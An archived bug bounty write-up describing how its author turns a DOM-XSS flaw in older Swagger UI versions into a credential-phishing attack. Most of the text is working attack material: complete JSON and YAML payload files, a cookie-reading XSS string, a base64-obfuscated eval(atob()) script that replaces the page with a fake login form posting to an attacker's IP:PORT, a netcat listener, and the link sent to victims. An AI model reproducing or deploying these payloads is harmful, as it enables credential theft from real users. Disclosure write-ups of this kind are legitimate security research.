# How I was able to steal users credentials via Swagger UI DOM-XSS

- **Source URL:** https://medium.com/@M0X0101/how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss-e84255eb8c96?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230720165834/https://medium.com/@M0X0101/how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss-e84255eb8c96
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1134 (id 1134)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I was able to steal users credentials via Swagger UI DOM-XSS

--

Hello guys, today I’m gonna explain how i got DOM-XSS from Swagger-UI and exploit it to make HTML and JAVASCRIPT injections to create a realistic fake login.

first lets take a look at **Swagger UI :-)**

Swagger UI is a collection of HTML, Javascript, and CSS assets that dynamically generate documentation from a Swagger-compliant API. It provides users with interactive documentation, client SDK generation, and more.

I started to hunting as usual by doing subdomain enumeration for a public program lets say redirect.com

i found that subdomain “api.redirect.com”

wappalyzer said it used **Swagger UI** so i make some search about it and it’s vulnerabilities ,i found that Swagger UI affected with the XSS

from versions **3.14.1 to 3.37.0**

the vulnerability happen because it get URL to your JSON with path to YAML and render it with payload

JSON code:

```
{
    "url": "https://m0x0101.github.io/lol/test.yaml",
    "urls": [
        {
            "url": "https://m0x0101.github.io/lol/test.yaml",
            "name": "Foo"
        }
    ]
}
```
and YAML code:

```
swagger: '2.0'
info:
  title: XSS Attack BY M0X0101
  description: |
    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
  version: production
basePath: /JSSResource/
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
security:
  - basicAuth: []
paths:
  /M0X0101:
    get:
      responses:
        '200':
          description: No response was specified
      tags:
        - M0X0101_XSS_D
      operationId: findAccounts
      summary: Finds all accounts
  '/hack/hachid/{id}':
    delete:
      parameters:
        - description: |
            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
          format: int64
          in: path
          name: id
          required: true
          type: integer
      responses:
        '200':
          description: No response was specified
```
so i used that YAML and JSON to get alert with full URL

“https://api.redirect.com/swagger/index.html?configUrl=[https://m0x0101.github.io/lol/test.json](https://m0x0101.github.io/lol/test.json)”

at this point i just was like

so i directly reported it but unfortunately that was the response from the team

I tried to find any Auth function or login, sing-up page, but i found nothing

so i start to think in another scenario

i tried to use HTML injection, JS to make fake login page to get credential from user

so the normal code is

```
<form action=http://IP:PORT>Username:<br>
<input type=”username” name=”username”></br>Password:<br>
<input type=”username” name=”password”></br><br>
<input type=”submit” value=”Login”></br>
```
but in our scenario we inject in img tag so we need to store code in “id” as base64 encoded

and use eval function to execute atob function to decode code from base64

`eval(atob(this.id))````
document.body.innerHTML=''; 
var a=document.createElement('form');
a.action="http://IP:PORT";
a.method='POST';
a.innerHTML='<center>Username: <input type="text" name="userName"><br>Password: <input type="password" name="pwd"><br><input type="submit" value="Login"></center>'; 
document.body.appendChild(a);"'
```
so lets encode it and put it in “id”

`ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==``<img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>`
so now put the final payload to our YAML file

```
swagger: '2.0'
info:
  title: XSS Attack BY M0X0101
  description: |
    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>"></form>
  version: production
basePath: /JSSResource/
produces:
  - application/xml
  - application/json
consumes:
  - application/xml
  - application/json
security:
  - basicAuth: []
paths:
  /M0X0101:
    get:
      responses:
        '200':
          description: No response was specified
      tags:
        - M0X0101_XSS_D
      operationId: findAccounts
      summary: Finds all accounts
  '/hack/hachid/{id}':
    delete:
      parameters:
        - description: |
            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7IHZhciBhPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTthLmFjdGlvbj0iaHR0cDovL0lQOlBPUlQiO2EubWV0aG9kPSdQT1NUJzthLmlubmVySFRNTD0nPGNlbnRlcj5Vc2VybmFtZTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==' onerror='eval(atob(this.id))'>"></form>
          format: int64
          in: path
          name: id
          required: true
          type: integer
      responses:
        '200':
          description: No response was specified
```
so lets tried gain

put the path of YAML into JSON and put JSON path to parameter “configUrl”

“https://api.redirect.com/swagger/index.html?configUrl=[https://m0x0101.github.io/lol/xss\_credentials\_form.json](https://m0x0101.github.io/lol/xss_credentials_form.json)”

and run net cat at the server to get the credential

`nc -lvvp 1337`
now every thing is ready just send

“https://api.redirect.com/swagger/index.html?configUrl=[https://m0x0101.github.io/lol/xss\_credentials\_form.json](https://m0x0101.github.io/lol/xss_credentials_form.json)”

to victim and wait until he out the credential

and Bingoooooo

Thanks for reading, hope you learned something new.

for questions or feedback dm me her [Twitter](https://twitter.com/M0x0101) and her [LinkedIn](https://www.linkedin.com/in/m0x0101/)
